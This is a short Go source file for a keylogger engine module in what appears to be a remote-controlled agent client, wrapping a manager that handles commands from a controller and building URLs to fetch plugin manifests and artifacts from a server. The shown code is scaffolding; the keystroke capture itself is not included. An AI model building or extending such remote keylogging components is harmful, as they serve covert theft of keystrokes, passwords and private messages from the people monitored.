package keyloggerengine

import (
	"context"
	"fmt"
	"strings"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

type keyloggerEngine struct {
	manager *Manager
}

func NewKeyloggerEngine(cfg Config) Engine {
	return &keyloggerEngine{
		manager: NewManager(cfg),
	}
}

func (e *keyloggerEngine) Configure(cfg Config) error {
	e.manager.UpdateConfig(cfg)
	return nil
}

func (e *keyloggerEngine) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
	return e.manager.HandleCommand(ctx, cmd)
}

func (e *keyloggerEngine) Shutdown() {
	if e.manager != nil {
		e.manager.Shutdown(context.Background())
	}
}

func pluginEndpoints(baseURL, agentID, pluginID string) (manifestURL, artifactURL string) {
	baseURL = strings.TrimRight(baseURL, "/")
	manifestURL = fmt.Sprintf("%s/api/plugins/%s/manifest", baseURL, pluginID)
	artifactURL = fmt.Sprintf("%s/api/plugins/%s/artifact", baseURL, pluginID)
	return
}
